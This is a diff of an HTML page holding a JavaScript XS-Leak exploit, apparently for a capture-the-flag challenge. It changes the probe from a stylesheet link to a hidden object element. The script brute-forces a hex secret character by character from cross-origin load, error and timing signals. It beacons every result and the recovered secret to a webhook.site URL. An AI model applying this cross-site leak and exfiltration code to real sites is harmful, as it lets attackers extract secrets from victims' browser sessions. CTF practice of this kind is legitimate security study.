@@ -1,6 +1,6 @@
 <!DOCTYPE html>
 <html>
-<head><title>XS-Leak Link</title></head>
+<head><title>XS-Leak Object</title></head>
 <body>
 <div id="s">Loading...</div>
 <script>
@@ -8,7 +8,7 @@ var TARGET = "https://append-note-hfskv.instancer.lac.tf";
 var WEBHOOK = "https://webhook.site/70d9bf2c-e5cf-49dc-aeed-4203dbfd538d";
 var CHARS = "0123456789abcdef";
 
-navigator.sendBeacon(WEBHOOK, "LINK_V1");
+navigator.sendBeacon(WEBHOOK, "OBJ_V1");
 
 function report(d) {
     navigator.sendBeacon(WEBHOOK, d);
@@ -16,50 +16,49 @@ function report(d) {
 }
 function setStatus(s) { document.getElementById('s').textContent = s; }
 
-// Test using link stylesheet - 200 vs 404 might have different load/error behavior
+// Test using object element
 function testChar(prefix, c) {
     return new Promise(function(resolve) {
         var url = TARGET + "/append?content=" + encodeURIComponent(prefix + c) + "&url=" + encodeURIComponent(TARGET + "/");
         
-        var link = document.createElement('link');
-        link.rel = 'stylesheet';
-        link.href = url;
+        var obj = document.createElement('object');
+        obj.data = url;
+        obj.style.position = 'absolute';
+        obj.style.left = '-9999px';
         
         var start = performance.now();
         var resolved = false;
         
-        link.onload = function() {
+        obj.onload = function() {
             if (!resolved) {
                 resolved = true;
                 var elapsed = performance.now() - start;
-                document.head.removeChild(link);
+                try { document.body.removeChild(obj); } catch(e) {}
                 resolve({ c: c, status: 'load', time: elapsed });
             }
         };
         
-        link.onerror = function() {
+        obj.onerror = function() {
             if (!resolved) {
                 resolved = true;
                 var elapsed = performance.now() - start;
-                try { document.head.removeChild(link); } catch(e) {}
+                try { document.body.removeChild(obj); } catch(e) {}
                 resolve({ c: c, status: 'error', time: elapsed });
             }
         };
         
-        document.head.appendChild(link);
+        document.body.appendChild(obj);
         
-        // Timeout
         setTimeout(function() {
             if (!resolved) {
                 resolved = true;
-                try { document.head.removeChild(link); } catch(e) {}
+                try { document.body.removeChild(obj); } catch(e) {}
                 resolve({ c: c, status: 'timeout', time: 5000 });
             }
         }, 5000);
     });
 }
 
-// Test all 16 chars in parallel
 function testPosition(prefix) {
     var promises = [];
     for (var i = 0; i < CHARS.length; i++) {
@@ -70,7 +69,7 @@ function testPosition(prefix) {
 
 async function main() {
     report('START');
-    setStatus('Testing...');
+    setStatus('Testing with object...');
     
     try {
         var secret = "";
@@ -79,23 +78,20 @@ async function main() {
             setStatus('P' + p + '...');
             var results = await testPosition(secret);
             
-            // Count load vs error
             var loads = results.filter(function(r) { return r.status === 'load'; });
             var errors = results.filter(function(r) { return r.status === 'error'; });
             
             report('P' + p + ':L=' + loads.length + ',E=' + errors.length);
             
-            // Report details
-            var detail = results.map(function(r) { return r.c + ':' + r.status[0]; }).join('');
+            var detail = results.map(function(r) { return r.c + ':' + r.status[0] + Math.round(r.time); }).join(',');
             report('P' + p + 'D:' + detail);
             
-            // If one is different from majority, that's the answer
-            if (loads.length === 1) {
-                secret += loads[0].c;
-            } else if (errors.length === 1) {
+            if (errors.length === 1) {
                 secret += errors[0].c;
+            } else if (loads.length === 1) {
+                secret += loads[0].c;
             } else {
-                // Fallback to timing
+                // Pick by timing
                 results.sort(function(a,b) { return a.time - b.time; });
                 secret += results[0].c;
             }
